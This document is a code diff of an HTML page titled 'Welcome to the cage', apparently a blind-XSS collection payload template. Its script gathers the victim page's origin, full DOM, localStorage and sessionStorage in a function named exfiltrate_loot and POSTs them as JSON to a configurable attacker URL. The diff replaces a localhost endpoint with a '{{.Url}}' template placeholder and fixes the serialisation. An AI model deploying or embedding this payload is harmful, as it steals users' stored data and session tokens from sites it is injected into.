@@ -1,4 +1,5 @@
-<html><head>
+<html>
+    <head>
         <title>Welcome to the cage</title>
     </head>
     <body>
@@ -25,24 +26,23 @@
                     try { collected_data["Browser Time"] = return_value(new Date().toTimeString()); } catch(e) {}
                     try { collected_data["Origin"] = return_value(location.origin); } catch(e) {}
                     try { collected_data["DOM"] = return_value(document.documentElement.outerHTML); } catch(e) {}
-                    
-                    try { collected_data["localStorage"] = return_value(localStorage.toSource()); } catch(e) {}
-                    try { collected_data["sessionStorage"] = return_value(sessionStorage.toSource()); } catch(e) {}
+                    //collected_data["DOM"] = collected_data["DOM"].slice(0, 4096)
+                    try { collected_data["localStorage"] = return_value(JSON.stringify(localStorage)); } catch(e) {}
+                    try { collected_data["sessionStorage"] = return_value(JSON.stringify(sessionStorage)); } catch(e) {}
                 }
 
 
                 function exfiltrate_loot() {
-                    var xhr = new XMLHttpRequest()
-                    console.log(collected_data)
-                    
-                    xhr.open("POST", "http://localhost:8899/c", true)
-
-                    xhr.setRequestHeader("Content-Type", "application/json")
+                    var xhr = new XMLHttpRequest();
+                    console.log(collected_data);
+                    xhr.open("POST", "{{.Url}}", true);
+                    xhr.setRequestHeader("Content-Type", "application/json");
                     xhr.send(JSON.stringify(collected_data));
                 }
 
-
-                collect_data()
-                exfiltrate_loot()
+                collect_data();
+                exfiltrate_loot();
             })();
-        </script></body></html>
+        </script>
+    </body>
+</html>
